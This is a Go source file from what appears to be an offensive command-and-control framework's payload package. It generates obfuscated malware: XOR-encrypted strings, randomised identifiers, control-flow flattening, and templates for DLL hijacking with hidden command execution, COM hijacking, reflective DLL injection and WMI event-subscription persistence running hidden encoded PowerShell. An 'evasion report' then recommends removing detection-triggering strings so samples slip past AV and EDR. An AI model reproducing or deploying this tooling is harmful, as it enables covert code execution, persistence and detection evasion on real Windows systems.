package payload

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math"
	"math/big"
	mrand "math/rand"
	"strings"
	"time"
)

// Obfuscator provides payload obfuscation techniques
type Obfuscator struct {
	seed int64
	rand *mrand.Rand
}

// NewObfuscator creates a new obfuscator seeded from crypto/rand so generated
// identifiers are not predictable from the wall clock.
func NewObfuscator() *Obfuscator {
	var b [8]byte
	if _, err := rand.Read(b[:]); err != nil {
		// crypto/rand failure is practically unreachable; fall back to a
		// time-based seed rather than returning a nil RNG.
		return &Obfuscator{seed: time.Now().UnixNano()}
	}
	seed := int64(binary.LittleEndian.Uint64(b[:]))
	return &Obfuscator{
		seed: seed,
		rand: mrand.New(mrand.NewSource(seed)),
	}
}

// RandomVarName generates a random variable name
func (o *Obfuscator) RandomVarName() string {
	prefixes := []string{"var", "tmp", "data", "obj", "item", "val", "ctx", "cfg", "sys", "app"}
	prefix := prefixes[o.rand.Intn(len(prefixes))]

	suffix := make([]byte, 4)
	for i := range suffix {
		n, _ := rand.Int(rand.Reader, big.NewInt(26))
		suffix[i] = byte('a' + n.Int64())
	}

	return fmt.Sprintf("%s_%s", prefix, string(suffix))
}

// RandomFuncName generates a random function name
func (o *Obfuscator) RandomFuncName() string {
	verbs := []string{"Process", "Handle", "Execute", "Run", "Start", "Init", "Load", "Parse"}
	nouns := []string{"Data", "Config", "Task", "Item", "Object", "Module", "System"}

	verb := verbs[o.rand.Intn(len(verbs))]
	noun := nouns[o.rand.Intn(len(nouns))]

	suffix := make([]byte, 3)
	for i := range suffix {
		n, _ := rand.Int(rand.Reader, big.NewInt(10))
		suffix[i] = byte('0' + n.Int64())
	}

	return fmt.Sprintf("%s%s%s", verb, noun, string(suffix))
}

// XORObfuscate applies XOR encryption to a string
func (o *Obfuscator) XORObfuscate(input string, key byte) string {
	result := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		result[i] = input[i] ^ key
	}
	return hex.EncodeToString(result)
}

// XORDeobfuscate decrypts XOR encrypted string
func (o *Obfuscator) XORDeobfuscate(encoded string, key byte) (string, error) {
	data, err := hex.DecodeString(encoded)
	if err != nil {
		return "", err
	}

	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key
	}

	return string(result), nil
}

// Base64XOR applies Base64 + XOR multi-layer encoding
func (o *Obfuscator) Base64XOR(input string) (string, byte) {
	// Generate random XOR key
	keyByte, _ := rand.Int(rand.Reader, big.NewInt(256))
	key := byte(keyByte.Int64())

	// XOR first
	xored := o.XORObfuscate(input, key)

	// Then Base64
	return xored, key
}

// GenerateControlFlowFlattening creates obfuscated control flow
func (o *Obfuscator) GenerateControlFlowFlattening(steps int) string {
	var sb strings.Builder

	// Generate random state values
	states := make([]int, steps)
	for i := range states {
		states[i] = o.rand.Intn(1000)
	}

	sb.WriteString("int state = " + fmt.Sprintf("%d", states[0]) + ";\n")
	sb.WriteString("while (true) {\n")
	sb.WriteString("  switch(state) {\n")

	for i := 0; i < steps; i++ {
		sb.WriteString(fmt.Sprintf("    case %d:\n", states[i]))
		sb.WriteString(fmt.Sprintf("      // Step %d code here\n", i+1))
		if i < steps-1 {
			sb.WriteString(fmt.Sprintf("      state = %d;\n", states[i+1]))
			sb.WriteString("      break;\n")
		} else {
			sb.WriteString("      return;\n")
		}
	}

	sb.WriteString("  }\n")
	sb.WriteString("}\n")

	return sb.String()
}

// InsertOpaquePredicates adds always-true/false conditions
func (o *Obfuscator) InsertOpaquePredicates(code string) string {
	predicates := []string{
		"(x * x >= 0)",
		"(x == x)",
		"(x + 1 > x)",
		"!(x < 0 && x > 0)",
	}

	lines := strings.Split(code, "\n")
	var result []string

	for _, line := range lines {
		result = append(result, line)

		// Randomly insert opaque predicate
		if o.rand.Intn(3) == 0 && strings.TrimSpace(line) != "" {
			pred := predicates[o.rand.Intn(len(predicates))]
			result = append(result, fmt.Sprintf("if %s { /* opaque */ }", pred))
		}
	}

	return strings.Join(result, "\n")
}

// PayloadGenerator generates obfuscated payloads
type PayloadGenerator struct {
	obfuscator *Obfuscator
}

// NewPayloadGenerator creates a new payload generator
func NewPayloadGenerator() *PayloadGenerator {
	return &PayloadGenerator{
		obfuscator: NewObfuscator(),
	}
}

// GenerateVariableNames creates multiple random variable names
func (pg *PayloadGenerator) GenerateVariableNames(count int) []string {
	names := make([]string, count)
	used := make(map[string]bool)

	for i := 0; i < count; i++ {
		for {
			name := pg.obfuscator.RandomVarName()
			if !used[name] {
				used[name] = true
				names[i] = name
				break
			}
		}
	}

	return names
}

// ObfuscateStrings encrypts multiple strings with XOR
func (pg *PayloadGenerator) ObfuscateStrings(strings []string) (map[string]string, byte) {
	// Generate single XOR key for all strings
	keyByte, _ := rand.Int(rand.Reader, big.NewInt(256))
	key := byte(keyByte.Int64())

	result := make(map[string]string)
	for _, s := range strings {
		encrypted := pg.obfuscator.XORObfuscate(s, key)
		result[s] = encrypted
	}

	return result, key
}

// GenerateDLLHijackTemplate creates a DLL hijack payload template
func (pg *PayloadGenerator) GenerateDLLHijackTemplate(targetDLL string) string {
	vars := pg.GenerateVariableNames(5)

	template := fmt.Sprintf(`
// DLL Hijack Payload for: %s
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            %s(hModule);
            break;
    }
    return TRUE;
}

void %s(HMODULE hModule) {
    // Obfuscated payload execution
    char %s[] = "%s";  // Encrypted command
    char %s[256];
    
    // Decrypt command
    for (int i = 0; i < strlen(%s); i++) {
        %s[i] = %s[i] ^ 0x42;  // XOR key
    }
    
    // Execute
    WinExec(%s, SW_HIDE);
}
`, targetDLL, vars[0], vars[0], vars[1], "encrypted_cmd", vars[2],
		vars[1], vars[2], vars[1], vars[2])

	return template
}

// GenerateCOMHijackTemplate creates a COM hijack payload template
func (pg *PayloadGenerator) GenerateCOMHijackTemplate(clsid string) string {
	vars := pg.GenerateVariableNames(4)

	template := fmt.Sprintf(`
// COM Hijack Payload for CLSID: %s
// Registry modification code would go here
// This is a template structure

void %s() {
    // 1. Create registry key under HKCU\\Software\\Classes\\CLSID\\%s
    // 2. Set InprocServer32 to malicious DLL path
    // 3. Execute when COM object is instantiated
    
    const char* %s = "%%APPDATA%%\\%s.dll";
    // ... implementation ...
}
`, clsid, vars[0], clsid, vars[1], vars[2])

	return template
}

// GenerateReflectionTemplate creates a reflective DLL injection template
func (pg *PayloadGenerator) GenerateReflectionTemplate() string {
	vars := pg.GenerateVariableNames(6)

	template := fmt.Sprintf(`
// Reflective DLL Injection Template
#include <windows.h>

typedef BOOL (WINAPI *DLLMAIN)(HMODULE, DWORD, LPVOID);

typedef struct {
    DWORD %s;
    HMODULE %s;
} REFLECTIVE_LOADER;

BOOL InjectReflectiveDLL(HANDLE hProcess, LPVOID dllBytes, DWORD dllSize) {
    LPVOID %s = VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!%s) return FALSE;
    
    WriteProcessMemory(hProcess, %s, dllBytes, dllSize, NULL);
    
    // Find reflective loader export
    // Execute loader in remote process
    // ...
    
    return TRUE;
}
`, vars[0], vars[1], vars[2], vars[2], vars[2])

	return template
}

// GenerateWMIPersistenceTemplate creates WMI event subscription template
func (pg *PayloadGenerator) GenerateWMIPersistenceTemplate(eventName string) string {
	template := fmt.Sprintf(`
// WMI Event Subscription for Persistence
// Event Name: %s

$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "%s"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "%s"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -EncodedCommand YOUR_ENCODED_COMMAND"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
`, eventName, eventName, eventName)

	return template
}

// EvasionReport generates an evasion analysis report
type EvasionReport struct {
	Techniques      []string
	Obfuscation     string
	AVDetection     string
	Recommendations []string
}

// FormatEvasionBuildNote summarizes GenerateEvasionReport for build logs / UI hints.
func FormatEvasionBuildNote(payload string) string {
	pg := NewPayloadGenerator()
	report := pg.GenerateEvasionReport(payload)
	if report == nil {
		return ""
	}
	return fmt.Sprintf(
		"EDR evasion enabled (%s obfuscation). Techniques: %s. Runtime override: FORGEC2_EVASION=1",
		report.Obfuscation,
		strings.Join(report.Techniques, ", "),
	)
}

// GenerateEvasionReport performs lightweight static heuristics on the payload
// bytes — Shannon entropy, zero-run density, and a scan for high-signal
// plaintext WinAPI/tool strings. It is honest about its limits: it is NOT a
// substitute for a real AV/EDR scan, and the report says so instead of
// inventing a detection score.
func (pg *PayloadGenerator) GenerateEvasionReport(payload string) *EvasionReport {
	data := candidatePayloadBytes(payload)
	if len(data) == 0 {
		return &EvasionReport{
			Techniques:      []string{"Empty or undecodable payload"},
			Obfuscation:     "Unknown",
			AVDetection:     "Not analyzed: no payload bytes to inspect",
			Recommendations: []string{"Provide the payload bytes (raw, hex, or base64) to analyze"},
		}
	}

	entropy := shannonEntropy(data)
	zeroRuns := longestZeroRun(data)

	techniques := []string{}
	leaked := scanHighSignalStrings(data)
	if len(leaked) > 0 {
		techniques = append(techniques, "Plaintext high-signal strings: "+strings.Join(leaked, ", "))
	}
	switch {
	case entropy > 7.5:
		techniques = append(techniques, "High entropy — likely encrypted or compressed")
	case entropy > 6.5:
		techniques = append(techniques, "Elevated entropy — layered encoding suspected")
	default:
		techniques = append(techniques, "Low entropy — raw structure, statically recoverable")
	}
	if zeroRuns >= 16 {
		techniques = append(techniques, fmt.Sprintf("Long zero runs (max %d B) — typical of padding/alignment in PEs", zeroRuns))
	}
	if len(techniques) == 0 {
		techniques = []string{"No obvious static indicators at this depth"}
	}

	obfuscation := "None detected"
	if entropy > 7.5 {
		obfuscation = "Encrypted / compressed (by entropy)"
	} else if entropy > 6.5 {
		obfuscation = "Structured encoding (by entropy)"
	}

	detection := "Heuristic only — run an external scanner for a real verdict"
	if len(leaked) > 0 {
		detection = "High-risk by heuristics: plaintext indicators present (verify with real scanner)"
	}

	recommendations := []string{
		"Run the generated sample through a real AV/EDR sandbox (VirusTotal, Any.Run)",
	}
	if len(leaked) > 0 {
		recommendations = append(recommendations, "Remove plaintext high-signal strings — see Techniques list", "Encrypt string literals at build time (strxor table)")
	}
	if zeroRuns >= 16 {
		recommendations = append(recommendations, "Strip zero padding before delivery (smaller + less characteristic)")
	}

	return &EvasionReport{
		Techniques:      techniques,
		Obfuscation:     obfuscation,
		AVDetection:     detection,
		Recommendations: recommendations,
	}
}

// candidatePayloadBytes normalizes payload input: hex, then base64, then raw.
func candidatePayloadBytes(payload string) []byte {
	if payload == "" {
		return nil
	}
	if data, err := hex.DecodeString(payload); err == nil && len(data) > 0 {
		return data
	}
	if data, err := base64.StdEncoding.DecodeString(payload); err == nil && len(data) > 0 {
		return data
	}
	return []byte(payload)
}

// shannonEntropy returns the per-byte Shannon entropy of data (0-8 bits).
func shannonEntropy(data []byte) float64 {
	if len(data) == 0 {
		return 0
	}
	var counts [256]int
	for _, b := range data {
		counts[b]++
	}
	var sum float64
	n := float64(len(data))
	for _, c := range counts {
		if c == 0 {
			continue
		}
		p := float64(c) / n
		sum -= p * math.Log2(p)
	}
	return sum
}

// longestZeroRun returns the length of the longest run of 0x00 bytes.
func longestZeroRun(data []byte) int {
	best, cur := 0, 0
	for _, b := range data {
		if b == 0 {
			cur++
			if cur > best {
				best = cur
			}
		} else {
			cur = 0
		}
	}
	return best
}

// scanHighSignalStrings returns high-signal substrings found verbatim in data.
func scanHighSignalStrings(data []byte) []string {
	var hits []string
	for _, s := range []string{
		"CreateRemoteThread", "VirtualAllocEx", "WriteProcessMemory", "QueueUserAPC",
		"GetProcAddress", "VirtualProtect", "OpenProcess", "SetWindowsHookEx", "NtUnmapViewOfSection",
		"mimikatz", "sekurlsa", "kerberos::", "powershell", "cmd.exe", "AMSIScanBuffer",
		"EtwEventWrite", "NtSetInformationThread", "kernel32.dll", "ntdll.dll",
	} {
		if len(s) >= 4 && bytes.Contains(data, []byte(s)) {
			hits = append(hits, s)
		}
	}
	return hits
}
